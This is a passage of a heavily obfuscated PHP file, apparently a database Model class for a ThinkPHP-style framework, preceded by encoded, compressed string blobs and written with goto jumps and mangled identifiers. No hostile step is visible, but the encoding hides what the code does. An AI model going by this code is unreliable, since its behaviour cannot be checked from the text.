\x7b\xc3\x43\xaa\xca\x32\x23\xbc\xa2\xdb\xb8\x1f\xfa\xa\x88\xe8\x44\xb6\x32\xac\x22\xfb\x3a\xae\xa0\x81\x93\x25\x29"."\206\153\147\327\236\350\240\155\121\11\250\7\203\25\352\317\134\301\136\332\217\166\316\117\171\1\360\363\146\42\356\22\133\327\226\13\341\272\72\135\44\152\11\247\222\70\306\333\112\131\73\246"."\374\252\114\366\115\3\305\334\311\314\303\13\245\321\102\375\302\17\335\356\102\335\352\101\247\45\261\303\300\204\164\121\12\315\352\304\115\206\120\212\315\217\342\334\161\245\375\103\221\53\102\73".base64_decode('cSKD5T49CmnmXOIfpEIqtsrBvsYtjQPlR3lMm5+wcfWBlLSlhmX+N0GLeOeLpjq0CSQvBw==')."\x3c\x2b\x6a\x6\x6b\xbc\xc6\xda\x46\x94\x49\x89\x37\x9\xe9\xd0\xef\x8a\xba\x55\x6f\x71\x9\x89\xe3\x41\x51\x69\x37\x26\xbc\x80\xcd\xb6\x73\xe6\x4b\x42\xa8\xac\x92\xa0\x20\xc0\x6f\x5d\xba\x81\x5\x4e\x17\x78".base64_decode('FJc0HSu0D2rldeIW5IXGLDA1RT1pFlN4Q5Qs9OTtmN4nR4niAlsNwg69XAU2hiaRHbwKAw==').base64_decode('Sbskm1aTXFWgmOTNRGJUvfUK53BVWjONTJUSSP5KzK5Leiu9giPCrXipl99Du9hO9rBOkQ==')."\271\72\366\122\16\127\100\254\132\341\36\130\162\32\252\26\233\210\27\75\223\213\220\157\226\25\241\151\230\261\22\117\352\344\24\13\73\45\351\144\263\130\51\245\302\247\110\222\64\242\111\316"."\151\303\350\210\101\202\204\21\235\351\172\173\353\247\171\231\241\102\371\231\35\73\274\301\76\202\26\226\204\6\370\370\313\310\30\150\112\103\76\221\307\224\156\364\211\35\51\141\174\206\230\306"."\342\363\111\154\150\361\130\121\342\45\164\256\105\115\214\114\311\144\135\250\56\121\345\152\234\241\263\122\72\35\41\234\334\342\120\207\167\145\100\353\303\231\16\136\107\104\143\250\235\53\323\241".base64_decode('nuiqBLzjyH5VSCnRD/FmAIFM6ttEGhihgkXNb7FHEZzICXDC5MByNS6MlVAltUcAJ+KaWg==')."\154\217\300\41\260\154\37\341\257\306\261\212\44\336\244\271\22\274\45\107\130\52\107\116\313\21\241\52\241\216\322\34\304\163\15\351\314\264\0\73\311\167\264\165\370\71\250\211\57\117\52\110"."\21\326\375\232\231\336\245\76\254\303\241\157\50\147\44\225\160\164\121\250\71\20\156\11\305\227\50\175\370\26\126\250\43\242\346\252\144\331\252\226\160\364\103\174\35\71\27\70\21\77\323\351"."\140\270\336\313\235\347\340\240\267\27\235\43\274\51\176\376\262\304\111\213\364\20\52\23\336\11\235\325\122\254\324\213\145\65\346\361\273\300\154\131\31\54\124\257\220\73\53\104\310\122\346\102"."\x51\x2f\xcf\x3f\xa2\x63\xb5\x48\xa9\xc5\x52\x81\x52\x85\xd6\x40\xfe\xca\x5f\x20\x9e\x8f\xe4\xdc\x88\x3d\xd2\xf3\x13\x35\xde\xc8\xf\x1a\x96\x21\xc8\x1\x2b\x31\x22\xd7\x1e\x68\x69\xf\x45\xd4\x40\x38\x1c\x5d"."\xee\x50\x2b\x16\xd7\x9\x45\x2e\x68\x49\xc9\x8e\xab\xa4\x99\x11\x93\x40\xbf\x5e\x6e\x5a\x12\xc\xf9\xc9\x9e\x3d\x5c\xc2\x17\x3a\x7d\xb2\xe5\xd2\x2\xbb\xf9\x2\x9f\xba\xdc\x1b\xd\x8d\x4a\x8e\xe5\xa\x45\xcd"."\xb0\x74\x9\x40\x7d\xa0\xd5\xc3\x53\x3b\x2d\x9b\x75\xf8\x87\xcd\xa6\xa5\x68\xc9\xb9\xdf\x56\xfc\x94\x4a\x3f\xc0\x60\x84\xd1\x9d\x38\x43\x2c\xb4\xa8\x2d\xf1\x3f\x6e\xaa\x91\x12\xd6\x7\x8d\x14\x53\x41\xe3\xcf".base64_decode('qqmjmmbZqzD7pnCHVA75nzrm84jbQ5UYQmOuP01ybAKensJCUZUawxOfQFxMcaQg39r6Uw==')."\x50\x3\xb6\xbe\x1a\x64\xef\x8a\x70\x44\x9c\x5b\x70\x2e\xa8\x4\x7f\x85\x9e\x66\xd1\x21\x1d\xb\x1c\xd9\x9\x87\x9\xef\x10\x19\x81\x1\x77\xa8\x5d\xba\x3c\xb\xba\xb5\xeb\x1d\x7e\x3\xcb\xbe\x41\x7c\xd1\xd0"."\x34\x72\xb9\x85\x72\xf6\x88\x3e\xa1\x18\xf7\x3d\x25\x8a\xba\x53\x2a\x34\x0\x25\x2b\x42\xc\xc6\x33\x28\x8d\x4a\x1d\x75\x72\xc9\xfd\xa\x29\xf3\x98\xf1\x8\xf1\x1\x62\x2b\x31\x98\x2b\xd8\x8e\x93\x7e\x9b\xfc".base64_decode('0kaaEgrAMqEiF/DROWdRPLHsftlU5b2T0GFx/sMamWZupAzgkJiFWW+4pjT2xZRPm/KoEw==')."\172\216\37\133\121\337\265\124\20\341\101\347\21\335\56\167\206\107\213\377\337\24\244\211\161\311\224\256\263\222\362\6\131\356\375\123\360\162\330\317\137\306\34\162\72\264\305\20\267\147\77\207".base64_decode('Tz9phRFTCLIXQmchT5lPLIV4JVcQMYK5x3o97KBLMkufnkx/uuGX7YbuRlA6B5+s5ajYnA==')."\61\262\251\42\327\330\22\200\166\135\110\37\110\51\104\130\12\32\363\276\116\174\176\266\60\222\16\156\270\52\271\173\304\26\122\235\336\304\204\223\66\261\365\72\235\126\161\65\1\113\54\41"."\xcb\x76\xb8\x49\x4b\x98\x9\xad\xcf\x43\x51\x15\x13\x45\x11\x6b\x1a\x91\xc3\xb2\xf6\x3e\xe9\x5\x4a\x64\x12\xc2\x14\x9f\xef\xf9\x52\x6\xe6\x34\x35\xe5\x21\x1e\x3d\x29\x5d\x74\xfb\xf9\x92\xd6\x27\x27\xbf\x72"."\351\76\142\200\23\324\11\35\117\363\212\350\210\246\263\55\304\221\215\202\374\132\241\40\356\113\344\35\27\375\353\170\165\15\151\235\211\66\225\330\41\121\251\336\103\134\340\234\164\207\111\201".strrev('X( 4McÑß—öÆ~#Ñì¹ÜîÉW&¿zÎÔvBï#—zj²”Z½è‡ÊYŸp').strrev(' "èåŞJÖ›ÑÜ•_n&CD%Oº›n!V1¦±Ä°+Ó È,Ç™AwO“æŒä˜'."\r".'\\©‡ó')."\77\55\172\232\37\232\160\134\260\11\262\131\45\241\263\343\366\240\132\356\15\226\171\176\145\253\10\334\276\126\360\345\72\241\53\130\217\170\262\375\125\116\353\304\3\341\2\232\25\247\137\137".strrev('—ôVGé‡‡nˆzÌT»õ ÃJİÊå@×©Z£‡…?—,Ârs*êÃáª}ÆÑÙIsğdÎ')."\353\160\241\347\236\320\12\36\167\277\266\102\170\33\101\16\165\51\47\1\154\230\327\133\144\67\334\356\154\206\3\167\321\136\54\136\15\122\73\323\145\173\305\312\134\152\332\364\231\163\144\341".base64_decode('iZhCce8Lxlng+hrYHYEUihMNFWbcWiYEJNH52KbcObNrM/ifLRhxDqFZJR3ecv/1ZSNA8A==')."\124\122\56\223\366\106\227\26\221\211\25\173\54\261\352\350\156\50\134\62\73\277\105\71\211\12\375\220\266\100\261\130\250\233\135\63\213\317\360\71\174\67\140\27\65\347\321\264\322\11\214\214"."\x4\x3b\xee\x61\xf1\xae\x88\x39\xf5\xac\x40\x5a\x23\x92\xa5\x23\x9a\x5c\xa3\x6d\xba\x45\x4d\xb8\x38\xde\x22\x89\xd8\x34\x9a\xcf\xc2\xe\x8e\xed\x59\x88\xd5\x26\x51\xa2\xff\xc1\x4\xb2\xd3\x16\x3d\x98\x9\x5"."\63\334\175\307\41\335\71\12\376\205\214\314\124\160\245\54\351\326\174\105\37\50\323\307\117\231\136\315\366\112\310\51\211\52\165\73\112\46\33\310\205\70\14\73\373\355\252\36\25\23\165\364".base64_decode('eJSJMpVzfpLHZWFJUeL5cGn2Gn0CWQJ5DO3knmSvruQlsTAERJauYxlLtuTll7ikInl9lA==')."\x57\x2d\xf9\xc8\x15\x12\x28\x22\xb2\x82\x1e\xc1\xe2\x26\xca\x16\xa4\x99\x81\x45\xfc\x1d\xb7\x26\x69\xb\x3a\xc5\x62\xc0\xe7\x49\xbe\xe1\xd1\xf0\x49\xee\xd3\x4d\x39\x2c\xf9\x5e\x46\x7b\x42\x94\x3d\xad\x40\xcd".base64_decode('cZxoUVzYKZfoV8oFZGNGiIZwFE6Y4CnA/srWAhxnKO5E1HGmstyehBGP6PCIkirz2w5klA==')."\74\263\243\137\223\66\142\261\347\212\120\244\224\23\21\111\324\114\16\142\74\321\141\124\1\133\17\164\121\14\146\252\301\162\371\46\247\126\307\151\230\235\27\376\327\116\164\377\137\371\316\235"."\xc9\xbd\xd5\xe0\xfa\xf9\x63\xc0\x45\xc0\xb5\x43\x6b\xf1\xcd\x2b\x17\x82\x50\x81\xb4\xab\x1f\xce\xcd\xf6\x0\xc0\x29\x34\xf8\xbe\x41\x41\x62\x48\x9c\xab\x9b\x33\xb\x92\xcc\xb0\xa4\xc6\x2e\xe6\xb4\x6c\x56\xda"."\222\53\237\163\312\234\243\43\124\34\340\336\260\53\105\334\117\212\335\216\322\273\210\74\230\171\72\357\21\124\5\303\52\25\223\335\53\273\134\253\223\272\20\104\252\205\153\47\102\146\166\342"."\141\347\262\12\13\202\202\30\73\56\110\135\336\110\16\124\270\236\47\252\274\116\167\3\22\317\123\226\115\64\37\261\106\314\306\247\237\205\222\370\100\112\54\331\300\64\310\326\6\242\5\166"."\164\255\205\315\245\147\41\43\202\304\302\11\320\102\231\376\71\100\145\124\63\341\230\134\7\120\236\67\101\332\174\14\57\34\45\332\135\336\237\151\46\113\36\133\307\215\104\271\266\106\171\151"."\x4e\x50\xe4\x22\xf8\xb9\x80\x53\xf8\x86\xa7\x15\x37\xcc\x5b\xe7\x75\x1\xea\xbd\xae\xea\xb8\x3\x6c\xe7\xa2\x71\x78\x64\xa6\x1a\x2e\x68\xa5\xc5\xb0\x90\x85\x9\xdb\xc8\xa5\x16\xb9\xdd\xf6\x96\x97\xa1\xb\x24".base64_decode('LvJMsEQrEwreKCFwxCF5PBjB6SiahP90QrngSVLqTkpSXTdLScGTfWWbIaO9jpnCKoPiMg==').base64_decode('NRGNBdXlIWwZI3R8sJNZdjZM4oOFVdnZXkPeysECQIejVlOgko6ooiRiFuaJ7VyhmV/9Og==')."\137\133\113\17\64\230\131\60\131\350\351\314\214\37\327\70\327\342\374\112\331\222\146\321\222\155\173\72\22\61\67\147\242\324\30\73\251\167\346\321\102\326\223\266\236\122\60\137\340\70\52\164".base64_decode('zaib3vNVtaB0nnPG1+SEM0t8updpF7M8FcuZ1IxPpTSEm3HbgUTCgY/bcU+rw0RWgySEVQ==').base64_decode('iLEw8OA0wdxEzGbBsbjSMGmYOBUfevn9NnOdgrX1/NiWGH5B4if4B7LzlWpOZYpKWNQgZA==').strrev('A¨q‘™€‘$iWNRòé È,hYD…D¢Dò¤Áœö6e"åŒZ$qvKá5–â„G')."\xba\x83\x76\xaa\x0\xf0\x77\xb6\x65\x5b\x6d\xc9\x8\x4b\xc9\xa4\x14\x33\x56\x8b\x7e\xb1\xb9\x80\x90\xb0\xf5\x44\x92\xe9\x3d\x5a\x60\x50\xe3\xe6\xd4\xdc\xa5\x3a\x1d\x27\x68\x49\x61\x20\x49\x68\x48\xb0\xfc\x4e".base64_decode('WFxVS2wrK4aP4IKHcMElmit2RW1QMOHiEJhKtWqDFbKmdLc5PAThWQkTL9n5EO999CH56w==')."\x90\x4f\x3c\xc7\x71\x64\x2c\x87\xa\x3b\x20\x52\x79\x71\xf\x28\xba\x89\x61\x95\xba\x4f\x68\xa0\xb3\xb8\x6c\x67\x84\x23\x95\x0\x51\xa7\x57\x5c\xbb\x46\x3a\x70\x63\xf5\x23\xa1\x76\x43\xbb\xc2\xe5\x4a\xe2\x93".base64_decode('TqsmPBufM5SHvPzzOqAuEQIW4TGW05UEQi2p+oqyLwkF9GxYqk7WEZiwQLzyRwRWOodYMg==')."\xe\x23\x12\x18\x53\x63\x3a\x6\x5f\xda\xd5\x78\xc7\x20\x67\x4c\x4e\x74\x34\xc7\x3d\xb5\xe4\xc4\x2b\xd0\x97\x2\x73\xe4\x2a\x81\xa6\x5\x9c\x49\x34\xbf\xee\x6a\xbd\x5c\xc0\xdd\x33\x5a\xc2\xe1\x25\x51\x86\xf"."\31\166\62\43\35\317\313\23\313\341\305\262\301\206\6\124\356\207\273\265\154\254\335\102\13\121\111\131\173\44\5\244\204\131\241\14\155\121\305\142\64\11\227\24\347\40\107\331\11\206\0\227".base64_decode('pUm4bFkyK1w2rqScrZWsCbpXPnggBEtV6LAQFUlZJxrPipnLPweY6M5NpGaVWyGEXS6Vjw==').base64_decode('Sq2omHnCVrhzC64EH3YrpTj0ppw7SiW6zVIqUGpKhSZUqBJKRuVbhkiroPJEP4n5I9nuZA==')."\x85\x64\x59\x7f\xaa\xb2\x86\x55\xac\x22\x95\xb1\x9c\xaa\x4f\x2e\xb8\x3c\x40\x60\x35\x1d\x78\x6c\x40\x60\xc4\xa4\x65\x8d\x1\xa1\x5a\xca\x5e\x9b\x4c\x76\x6c\x25\xa5\xfc\x40\xde\xe4\xdb\x53\x4a\x68\xe\x63\xde"."\x2a\x50\x74\x8f\x73\x59\x6d\x4e\xd4\xcf\x97\x24\x4b\xf5\x15\x1f\xbf\x78\xb0\x44\xaa\x5c\xda\x93\xd5\xf8\xa3\x45\xa1\x7d\x47\x4f\xd5\xa6\x6d\x24\x75\xa7\x39\x7c\xd9\xfc\x24\x4d\x67\x1f\xc9\x4a\xf2\x6f\x97\xe8".base64_decode('WcjHHEo4FQSyBESDPnELROuTmCOBE453apQlgcszegXfjPVC+OUrsdROt3CaHDeLtgenJQ==')."\314\2\371\155\62\155\133\150\264\120\21\24\141\304\361\76\354\221\24\266\120\110\334\264\342\106\221\173\73\202\266\204\142\221\40\50\3\140\331\116\134\247\251\204\316\71\42\370\76\220\107\344"."\x6d\x16\x94\x2\x5a\x4b\x2e\xb5\x5\x1\x18\x30\x53\xbd\xe6\x30\xb3\xf9\x88\xf0\x4a\x1a\x24\x71\x63\xa8\xb9\x79\x4b\xc1\x16\x1\x2a\xca\xea\x67\xc4\x4\x8a\xe5\xa7\x29\x7e\xf0\xbd\xe4\x25\x75\x80\x9f\x57\x5f".base64_decode('f6HPUZx6zuTK419VA9waiCqo4xUiwoV3dPFEvCypIxCPL4/GWqiflrJkUkpS8itL6miLRg==')."\46\112\13\266\7\102\341\262\64\254\17\30\121\205\365\120\232\24\352\40\255\44\367\337\23\265\42\324\274\104\264\244\334\150\53\273\244\13\203\303\115\61\57\322\245\125\41\143\262\273\50\226".strrev('òùóôá·û'."\0".'+Ô¾ía'."\r".'ˆeÏRètà<Ğ;1oóÉ‚”ã(¬¼ÂsĞÔºH¸™e®?')."\144\241\156\342\163\250\245\110\160\262\236\10\201\222\360\124\336\373\11\140\112\305\301\222\57\74\312\57\343\110\252\30\14\334\310\305\46\50\217\366\233\275\322\145\33\75\161\301\263\171\30\136".base64_decode('SZuThh3JttZXUTuDSq4xxRAy5f8DNr3MUEa6AAA=').strrev(''), 10, -8))); goto aäŒÉØŞà‡; aäŒÉØŞà‡: define($_SERVER[¶Ô„œ…¯][0], $_SERVER[¶Ô„œ…¯][1]); $_SERVER[ÏÆ£‘š] = explode($_SERVER[¶Ô„œ…¯][2], gzinflate(substr($_SERVER[¶Ô„œ…¯][3], 10, -8))); function binCheckEq($èĞğªèÅ, $¬¥¸ñ™•) { return $èĞğªèÅ == $¬¥¸ñ™•; } goto AùÏ‹³ğî; aß²ö©ø ´: while ($qwrmlfydpb < $_SERVER[¶Ô„œ…¯][685]) { if ($qwrmlfydpb >= 0) { break; } $qwrmlfydpb++; } $_SERVER[ñö”¸„‰] = explode($_SERVER[¶Ô„œ…¯][686], gzinflate(substr($_SERVER[¶Ô„œ…¯][687], 10, -8))); $kyvczqmslt = $_SERVER[¶Ô„œ…¯][688]; goto A’å”Ë“£; a¾èã´Ò†´: define($_SERVER[¶Ô„œ…¯][322], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\145", "\x6f\162\144\145\162", "\141\154\151\x61\163", "\x68\x61\166\x69\x6e\x67", "\x67\x72\x6f\x75\x70", "\x6c\x6f\143\153", "\144\151\x73\x74\x69\x6e\x63\164", "\141\165\x74\157", "\x66\x69\x6c\164\145\x72", "\x76\x61\154\151\144\x61\x74\x65", "\x72\x65\x73\165\154\x74", "\142\x69\156\x64", "\x74\157\153\145\x6e"); public function __construct($¹—ì˜ı = '', $¸ù›ÓÊ» = '', $«½šâÇ = '') { $²«ıÚæÑ =& $_SERVER[¶Ô„œ…¯]; $this->_initialize(); if (!empty($¹—ì˜ı)) { if (strpos($¹—ì˜ı, $²«ıÚæÑ[10])) { list($this->dbName, $this->name) = explode($²«ıÚæÑ[10], $¹—ì˜ı); } else { $this->name = $¹—ì˜ı; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($¸ù›ÓÊ»)) { $this->tablePrefix = $²«ıÚæÑ[12]; } elseif ($²«ıÚæÑ[12] != $¸ù›ÓÊ») { $this->tablePrefix = $¸ù›ÓÊ»; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($²«ıÚæÑ[323]); } $this->db(0, empty($this->connection) ? $«½šâÇ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ñü½¾›¯ =& $_SERVER[¶Ô„œ…¯]; if (empty($this->fields)) { if (think_config($ñü½¾›¯[324])) { $Ø•×–„÷ = $this->dbName ? $this->dbName : think_config($ñü½¾›¯[325]); $‰ğšä¾Û = think_var_cache($ñü½¾›¯[326] . strtolower(get_path_this($Ø•×–„÷) . $ñü½¾›¯[10] . $this->name)); if ($‰ğšä¾Û) { $æš‰“ î = think_config($ñü½¾›¯[327]); if (empty($æš‰“ î) || $‰ğšä¾Û[$ñü½¾›¯[328]] == $æš‰“ î) { $this->fields = $‰ğšä¾Û; return; } } } $this->flush(); } } public function flush() { $áüÛ÷Ø† =& $_SERVER[¶Ô„œ…¯]; $this->db->setModel($this->name); $ğ¯¶ù– = $this->db->getFields($this->getTableName()); if (!$ğ¯¶ù–) { return !1; } $this->fields = array_keys($ğ¯¶ù–); $this->fields[$áüÛ÷Ø†[329]] = !1; foreach ($ğ¯¶ù– as $¶º´‰Ê‰ => $‚ÀÌÇäÔ) { $–Ûö[$¶º´‰Ê‰] = $‚ÀÌÇäÔ[$áüÛ÷Ø†[33]]; if ($‚ÀÌÇäÔ[$áüÛ÷Ø†[39]]) { $this->fields[$áüÛ÷Ø†[330]] = $¶º´‰Ê‰; if ($‚ÀÌÇäÔ[$áüÛ÷Ø†[42]]) { $this->fields[$áüÛ÷Ø†[329]] = !0; } } } $this->fields[$áüÛ÷Ø†[331]] = $–Ûö; if (think_config($áüÛ÷Ø†[327])) { $this->fields[$áüÛ÷Ø†[328]] = think_config($áüÛ÷Ø†[327]); } if (think_config($áüÛ÷Ø†[324])) { $‰º¢­Òì = $this->dbName ? $this->dbName : think_config($áüÛ÷Ø†[325]); think_var_cache($áüÛ÷Ø†[326] . strtolower(get_path_this($‰º¢­Òì) . $áüÛ÷Ø†[10] . $this->name), $this->fields); } } public function switchModel($À‰ğÏ˜ó, $‰÷ıíæı = array()) { $¼‘üñç† =& $_SERVER[¶Ô„œ…¯]; $£©·õñç = ucwords(strtolower($À‰ğÏ˜ó)) . $¼‘üñç†[332]; if (!class_exists($£©·õñç)) { think_exception($£©·õñç . think_lang($¼‘üñç†[333])); } $this->_extModel = new $£©·õñç($this->name); if (!empty($‰÷ıíæı)) { foreach ($‰÷ıíæı as $ÑúÓ…œ§) { $this->_extModel->setProperty($ÑúÓ…œ§, $this->{$ÑúÓ…œ§}); } } return $this->_extModel; } public function __set($âŞÓ–Ñ, $¿î†ªúü) { $this->data[$âŞÓ–Ñ] = $¿î†ªúü; } public function __get($Ò…ßšÈÕ) { return isset($this->data[$Ò…ßšÈÕ]) ? $this->data[$Ò…ßšÈÕ] : null; } public function __isset($Ê£äçŠ) { return isset($this->data[$Ê£äçŠ]); } public function __unset($ ß²ß¹È) { unset($this->data[$ ß²ß¹È]); } public function __call($ú„¾œ¿, $Ğü§Àø) { $‚€„£º =& $_SERVER[¶Ô„œ…¯]; if (in_array(strtolower($ú„¾œ¿), $this->methods, !0)) { $this->options[strtolower($ú„¾œ¿)] = $Ğü§Àø[0]; return $this; } elseif (in_array(strtolower($ú„¾œ¿), array($‚€„£º[334], $‚€„£º[335], $‚€„£º[336], $‚€„£º[337], $‚€„£º[338]), !0)) { $ëü™»ÁÄ = isset($Ğü§Àø[0]) ? $Ğü§Àø[0] : $‚€„£º[222]; $ëü™»ÁÄ = $this->db->parseKey($ëü™»ÁÄ); return $this->getField(strtoupper($ú„¾œ¿) . $‚€„£º[339] . $ëü™»ÁÄ . $‚€„£º[340] . $ú„¾œ¿, $‚€„£º[334]); } elseif (strtolower(substr($ú„¾œ¿, 0, 5)) == $‚€„£º[341]) { $ëü™»ÁÄ = think_parse_name(substr($ú„¾œ¿, 5)); $›ŒÕĞÆş[$ëü™»ÁÄ] = $Ğü§Àø[0]; return $this->where($›ŒÕĞÆş)->find(); } elseif (strtolower(substr($ú„¾œ¿, 0, 10)) == $‚€„£º[342]) { $•Â–ØÜÉ = think_parse_name(substr($ú„¾œ¿, 10)); $›ŒÕĞÆş[$•Â–ØÜÉ] = $Ğü§Àø[0]; return $this->where($›ŒÕĞÆş)->getField($Ğü§Àø[1]); } elseif (isset($this->_scope[$ú„¾œ¿])) { return $this->scope($ú„¾œ¿, $Ğü§Àø[0]); } elseif (method_exists($this, $ú„¾œ¿)) { array_unshift($Ğü§Àø, $ú„¾œ¿); return call_user_func_array(array($this, $‚€„£º[343]), $Ğü§Àø); } else { return call_user_func_array(array(parent, $ú„¾œ¿), $Ğü§Àø); } } protected function call() { $Œª”œ§å =& $_SERVER[¶Ô„œ…¯]; $¬•áÂ = func_get_args(); $ÊÁØ“Œ = array_shift($¬•áÂ); $ñı´¸Û± = $ÊÁØ“Œ; if (is_array($ÊÁØ“Œ)) { $ñı´¸Û± = $ÊÁØ“Œ[1]; $ÊÁØ“Œ = $ÊÁØ“Œ[0]; } $¼¶½ê®‘ = count($¬•áÂ) - 1; if (isset($¬•áÂ[$¼¶½ê®‘]) && $¬•áÂ[$¼¶½ê®‘] === $ÊÁØ“Œ) { think_exception(__CLASS__ . $Œª”œ§å[4] . $ÊÁØ“Œ . think_lang($Œª”œ§å[344])); return; } $¬•áÂ[] = $ÊÁØ“Œ; if (method_exists($this, $Œª”œ§å[345])) { $ïêè­™Ä = call_user_func_array(array($this, $Œª”œ§å[346]), array($ñı´¸Û±, $¬•áÂ)); if (!is_null($ïêè­™Ä) && $ïêè­™Ä !== !1) { return $ïêè­™Ä; } } $ËîÏï¢÷ = call_user_func_array(array($this, $ÊÁØ“Œ), $¬•áÂ); if (method_exists($this, $Œª”œ§å[347])) { $ïêè­™Ä = call_user_func_array(array($this, $Œª”œ§å[348]), array($ñı´¸Û±, $¬•áÂ, $ËîÏï¢÷)); if ($ïêè­™Ä) { return $ïêè­™Ä; } } return $ËîÏï¢÷; } protected function _initialize() { } protected function _facade($åâ—˜°Ê) { $¡„°Íë =& $_SERVER[¶Ô„œ…¯]; if (!empty($this->fields)) { foreach ($åâ—˜°Ê as $‘‡‚”Ìå => $ÏàÒ™£) { if (is_array($this->fields) && !in_array($‘‡‚”Ìå, $this->fields, !0)) { unset($åâ—˜°Ê[$‘‡‚”Ìå]); } elseif (is_scalar($ÏàÒ™£)) { $this->_parseType($åâ—˜°Ê, $‘‡‚”Ìå); } } } if (!empty($this->options[$¡„°Íë[349]])) { $åâ—˜°Ê = array_map($this->options[$¡„°Íë[349]], $åâ—˜°Ê); unset($this->options[$¡„°Íë[349]]); } $this->_beforeWrite($åâ—˜°Ê); return $åâ—˜°Ê; } protected function _beforeWrite(&$¿¤×Ë§·) { } public function add($ş–ÏÙæ = '', $Ş¸ò’Üì = array(), $ÏéğÖâ = false) { if (empty($ş–ÏÙæ)) { if (!empty($this->data)) { $ş–ÏÙæ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¶Ô„œ…¯][350]); return !1; } } $Ş¸ò’Üì = $this->_parseOptions($Ş¸ò’Üì); $ş–ÏÙæ = $this->_facade($ş–ÏÙæ); if (!1 === $this->_beforeInsert($ş–ÏÙæ, $Ş¸ò’Üì)) { return !1; } $úçÙ¥Ï¤ = $this->db->insert($ş–ÏÙæ, $Ş¸ò’Üì, $ÏéğÖâ); if (!1 !== $úçÙ¥Ï¤) { $İ‰¥ç±ğ = $this->getLastInsID(); if ($İ‰¥ç±ğ) { $ş–ÏÙæ[$this->getPk()] = $İ‰¥ç±ğ; $this->_after_insert($ş–ÏÙæ, $Ş¸ò’Üì); return $İ‰¥ç±ğ; } $this->_after_insert($ş–ÏÙæ, $Ş¸ò’Üì); } return $úçÙ¥Ï¤; } protected function _beforeInsert(&$ğ¬ìİ³Ø, $œÁèß€ò) { } protected function _after_insert($ìñ„ˆ¸Ç, $Èáìû”º) { } public function addAll($«Û³ìÖö, $Øñ±Æ”† = array(), $Øø¨à„È = false) { $ÃÄ†›Ê® =& $_SERVER[¶Ô„œ…¯]; if (empty($«Û³ìÖö)) { $this->error = think_lang($ÃÄ†›Ê®[350]); return !1; } $Øñ±Æ”† = $this->_parseOptions($Øñ±Æ”†); foreach ($«Û³ìÖö as $…Â¬„ğ“ => $ØÔ™µ„®) { $«Û³ìÖö[$…Â¬„ğ“] = $this->_facade($ØÔ™µ„®); } if (method_exists($this->db, $ÃÄ†›Ê®[351])) { $©©æì¦® = $this->db->insertAll($«Û³ìÖö, $Øñ±Æ”†, $Øø¨à„È); } else { $this->startTrans(); foreach ($«Û³ìÖö as $…Â¬„ğ“ => $ØÔ™µ„®) { $©©æì¦® = $this->db->insert($ØÔ™µ„®, $Øñ±Æ”†, $Øø¨à„È); } $this->commit(); } if (!1 !== $©©æì¦®) { $Ê¥£Ç­Â = $this->getLastInsID(); if ($Ê¥£Ç­Â) { return $Ê¥£Ç­Â; } } return $©©æì¦®; } public function selectAdd($óĞ‡ÀÃ = '', $¤äÏëµ¬ = '', $é½„Çæ = array()) { $¡¶á¼ì‰ =& $_SERVER[¶Ô„œ…¯]; $é½„Çæ = $this->_parseOptions($é½„Çæ); if (!1 === ($„È±¬³¾ = $this->db->selectInsert($óĞ‡ÀÃ ? $óĞ‡ÀÃ : $é½„Çæ[$¡¶á¼ì‰[352]], $¤äÏëµ¬ ? $¤äÏëµ¬ : $this->getTableName(), $é½„Çæ))) { $this->error = think_lang($¡¶á¼ì‰[353]); return !1; } else { return $„È±¬³¾; } } public function save($Ç©É¿Èµ = '', $¯£ÎÅš“ = array()) { $ôØñ§˜Î =& $_SERVER[¶Ô„œ…¯]; if (empty($Ç©É¿Èµ)) { if (!empty($this->data)) { $Ç©É¿Èµ = $this->data; $this->data = array(); } else { $this->error = think_lang($ôØñ§˜Î[350]); return !1; } } $Ç©É¿Èµ = $this->_facade($Ç©É¿Èµ); $¯£ÎÅš“ = $this->_parseOptions($¯£ÎÅš“); $î®€î¨é = $this->getPk(); if (!isset($¯£ÎÅš“[$ôØñ§˜Î[354]])) { if (isset($Ç©É¿Èµ[$î®€î¨é])) { $íÁ©ÂŠ„[$î®€î¨é] = $Ç©É¿Èµ[$î®€î¨é]; $¯£ÎÅš“[$ôØñ§˜Î[354]] = $íÁ©ÂŠ„; unset($Ç©É¿Èµ[$î®€î¨é]); } else { $this->error = think_lang($ôØñ§˜Î[353]); return !1; } } if (is_array($¯£ÎÅš“[$ôØñ§˜Î[354]]) && isset($¯£ÎÅš“[$ôØñ§˜Î[354]][$î®€î¨é])) { $áŒºô€‹ = $¯£ÎÅš“[$ôØñ§˜Î[354]][$î®€î¨é]; } if (!1 === $this->_beforeUpdate($Ç©É¿Èµ, $¯£ÎÅš“)) { return !1; } $¸—¬á·Æ = $this->db->update($Ç©É¿Èµ, $¯£ÎÅš“); if (!1 !== $¸—¬á·Æ) { if (isset($áŒºô€‹)) { $Ç©É¿Èµ[$î®€î¨é] = $áŒºô€‹; } $this->_afterUpdate($Ç©É¿Èµ, $¯£ÎÅš“); } return $¸—¬á·Æ; } protected function _beforeUpdate(&$³ëºÑ¨Ì, $ÔØ»£ÏŒ) { } protected function _afterUpdate($«ƒµîí», $°°îÁÑÛ) { } public function delete($¢©ã·”™ = array()) { $ÍæŒô– =& $_SERVER[¶Ô„œ…¯]; if (empty($¢©ã·”™) && empty($this->options[$ÍæŒô–[354]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $·İ˜´Ö = $this->getPk(); if (is_numeric($¢©ã·”™) || is_string($¢©ã·”™)) { if (strpos($¢©ã·”™, $ÍæŒô–[50])) { $ååÅÌ¡¶[$·İ˜´Ö] = array($ÍæŒô–[355], $¢©ã·”™); } else { $ååÅÌ¡¶[$·İ˜´Ö] = $¢©ã·”™; } $this->options[$ÍæŒô–[354]] = $ååÅÌ¡¶; } $¢©ã·”™ = $this->_parseOptions(); if (is_array($¢©ã·”™[$ÍæŒô–[354]]) && 